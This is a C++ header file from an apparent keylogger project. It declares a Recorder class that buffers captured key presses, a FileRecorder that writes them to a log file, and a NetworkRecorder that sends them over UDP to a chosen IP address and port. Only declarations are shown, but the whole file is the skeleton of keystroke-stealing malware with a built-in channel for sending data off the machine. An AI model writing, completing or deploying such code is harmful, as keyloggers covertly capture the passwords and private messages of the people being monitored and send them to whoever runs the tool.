#ifndef RECORDER_H_
#define RECORDER_H_

#include <filesystem>
#include <string>
#include <vector>

#include "io/udp/udp_socket.h"

namespace keylogger {

class Recorder {
 public:
  Recorder() = delete;
  explicit Recorder(int key_limit);
  virtual ~Recorder() = default;
  Recorder(const Recorder&) = default;
  Recorder& operator=(const Recorder&) = default;
  Recorder(Recorder&&) = default;
  Recorder& operator=(Recorder&&) = default;

  void BufferKeyPress(char character);
  virtual void Transmit() = 0;

 protected:
  using CharList = std::vector<char>;

  int num_keys_;
  CharList keys_;
};

class FileRecorder : public Recorder {
 public:
  using FilePath = std::filesystem::path;

  FileRecorder() = delete;
  [[nodiscard]] FileRecorder(int key_limit, const FilePath& log_path);
  FileRecorder(const FileRecorder&) = default;
  FileRecorder& operator=(const FileRecorder&) = default;
  FileRecorder(FileRecorder&&) = default;
  FileRecorder& operator=(FileRecorder&&) = default;

  void Transmit() final;

 private:
  FilePath log_path_;
};

class NetworkRecorder : public Recorder {
 public:
  NetworkRecorder() = delete;
  [[nodiscard]] NetworkRecorder(int key_limit, const std::string& ip, int port);
  NetworkRecorder(const NetworkRecorder&) = default;
  NetworkRecorder& operator=(const NetworkRecorder&) = default;
  NetworkRecorder(NetworkRecorder&&) = default;
  NetworkRecorder& operator=(NetworkRecorder&&) = default;

  void Transmit() final;

 private:
  UdpSocket tx_socket_;
};

}  // namespace keylogger

#endif
